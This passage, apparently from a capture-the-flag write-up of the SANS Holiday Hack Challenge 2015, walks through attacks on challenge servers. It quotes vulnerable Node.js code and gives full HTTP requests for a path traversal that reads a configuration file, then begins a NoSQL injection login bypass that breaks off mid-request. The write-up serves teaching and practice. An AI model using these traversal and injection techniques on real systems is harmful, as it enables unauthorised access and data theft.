  &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;readFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./public/images/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;end&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the &lt;code&gt;camera&lt;/code&gt; parameter goes through no sanitization. The
only thing done to this parameter is that it is appended with the
&lt;code&gt;'.png'&lt;/code&gt; string. However, on some version of the gnome, this string is
appended only if it is not previously found in the parameter. This means that
if we find a directory with &lt;code&gt;.png&lt;/code&gt; in its name, we can access any file.&lt;/p&gt;
&lt;p&gt;Fortunately, we can create a directory with an arbitray name:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// File www/route/index.js, line 127&lt;/span&gt;
&lt;span class="c1"&gt;// SETTINGS UPLOAD&lt;/span&gt;
&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/settings&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;logged_in&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;user_level&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;99&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// AUGGIE: settings upload allowed for admins (admins are 100, currently)&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;filen&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;filen&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;dirname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/gnome/www/public/upload/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;newdir&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;filen&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;free&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;disk&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;check&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;info&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;free&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;info&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;free&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;      &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;mknewdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;lastIndexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
&lt;/span&gt;      &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Dir &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;lastIndexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/ created successfully!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;EEXIST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;free&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;99999999999&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// AUGGIE: I think this is breaking uploads?  Stuart why did you set this so high?&lt;/span&gt;
      &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Insufficient space!  File creation error!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;index&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;GIYH::ADMIN PORT V.01&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;session&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This time, the parameter without any sanitization is &lt;code&gt;filen&lt;/code&gt;, which is
the name of our new settings file. Since it's not sanitized, we can put
special characters, like &lt;code&gt;/&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/settings&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;52.34.3.80&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://52.34.3.80/settings&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;sessionid=jle7GDOGWl2hB4Upp5ry&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;26&lt;/span&gt;

filen=foo.png/foo&amp;amp;file=bar
&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="sg02_folder_creation_success.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg02_folder_creation_success.png" /&gt;
&lt;p&gt;Then we can use the path traversal vulnerability to recover the configuration
file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/cam?camera=../upload/YoGjNkHo/foo.png/../../../../../../gnome/www/files/gnome.conf&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;52.34.3.80&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;sessionid=jle7GDOGWl2hB4Upp5ry&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;X-Powered-By&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;GIYH::SuperGnome by AtnasCorp&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sun, 20 Dec 2015 18:58:59 GMT&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;339&lt;/span&gt;

Gnome Serial Number: XKCD988
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-02
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The flag for this SuperGnome is &lt;code&gt;XKCD988&lt;/code&gt;
(&lt;a class="reference external" href="https://xkcd.com/988/"&gt;geeky reference&lt;/a&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id3"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://52.64.191.71/"&gt;SuperGnome03&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We can't even connect to this SuperGnome with our stolen credentials!&lt;/p&gt;
&lt;img alt="sg03_failed_login.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg03_failed_login.png" /&gt;
&lt;p&gt;That means that we have to bypass authentication somehow. The usual way is
using an SQL injection. But since the DBMS is MongoDB, we can't use traditional
SQL injection: we have to use NoSQL injection.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// File www/routes/index.js, line 105&lt;/span&gt;
&lt;span class="c1"&gt;// LOGIN POST&lt;/span&gt;
&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;db&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="nx"&gt;db&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;users&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;findOne&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// STUART: Removed this in favor of below.  Really guys?&lt;/span&gt;
&lt;/span&gt;  &lt;span class="c1"&gt;//db.get(&amp;#39;users&amp;#39;).findOne({username: (req.body.username || &amp;quot;&amp;quot;).toString(10), password: (req.body.password || &amp;quot;&amp;quot;).toString(10)}, function (err, user) { // LOUISE: allow passwords longer than 10 chars&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Invalid username and password: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Invalid username or password!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;index&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;GIYH::ADMIN PORT V.01&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;session&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;sessionid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;gen_session&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
      &lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;logged_in&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;user_level&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;user_level&lt;/span&gt; &lt;span class="p"&gt;};&lt;/span&gt;
      &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;User level:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;user_level&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sessionid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;writeHead&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;301&lt;/span&gt;&lt;span class="p"&gt;,{&lt;/span&gt; &lt;span class="nx"&gt;Location&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;end&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the parameters &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; are not
converted to string before being used in the NoSQL query. This means that we
can send our login parameters in JSON, and they will automatically be converted
to a JavaScript object.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
